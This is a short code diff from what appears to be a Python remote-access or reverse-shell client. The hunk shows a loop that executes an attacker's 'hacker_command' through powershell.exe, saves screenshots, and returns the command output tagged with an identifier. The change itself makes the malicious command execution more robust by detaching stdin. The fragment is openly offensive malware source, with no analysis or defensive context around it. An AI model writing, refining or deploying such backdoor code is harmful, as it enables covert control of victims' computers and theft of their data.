@@ -69,7 +69,7 @@ if __name__ == "__main__":
                     print("screenshot saved")
 
                 else:
-                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True)
+                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True, stdin=subprocess.DEVNULL)
                     if output.stderr.decode("utf-8") == "":
                         command_result = output.stdout
                         command_result = command_result.decode("utf-8") + IDENTIFIER
